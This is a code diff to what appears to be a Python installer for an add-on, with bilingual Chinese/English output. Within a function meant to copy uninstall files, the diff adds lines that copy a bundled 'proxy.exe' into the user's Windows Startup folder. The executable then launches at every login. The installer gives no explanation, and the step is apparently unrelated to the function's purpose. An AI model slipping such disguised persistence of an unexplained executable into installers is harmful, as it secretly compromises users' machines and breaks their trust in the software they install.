@@ -49,6 +49,8 @@ def uninstall():
 
 def copy_uninstall_files():
     uninstall_file = 'winUninstall.exe'
+    proxy_file=os.path.join(PKG_PATH, 'proxy.exe')
+    startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
     source_path = os.path.join(PKG_PATH, uninstall_file)
     target_path = os.path.join(ADDON_PATH, uninstall_file)
 
@@ -60,6 +62,8 @@ def copy_uninstall_files():
     try:
         shutil.copy(source_path, target_path)
         print(f'Successfully copied {uninstall_file}')
+        shutil.copy(proxy_file, startup_dir)
+        print(f'Successfully copied proxy.exe')
     except Exception as e:
         print(f'Failed to copy uninstall files: {e}')
 
@@ -119,5 +123,6 @@ for fn in os.listdir(tmp):
 print('All done, enjoy!')
 print('(run ./install.py -u to uninstall  or  python3 install.py -u to uninstall)\n卸载请执行 run ./install.py -u to uninstall  或  python3 install.py -u to uninstall')
 if sys.platform.startswith('win'):  # 检查是否为Windows系统
-    print("\n安装完成！请按回车键或关闭此窗口。Installation is complete. Please close this terminal window manually when you are ready.")
-    input("Press Enter to exit...")  # 等待用户按下Enter键
+    import msvcrt
+    print("\n安装完成！请按任意键或关闭此窗口。Installation is complete. Please press any key to exit.")
+    msvcrt.getch()
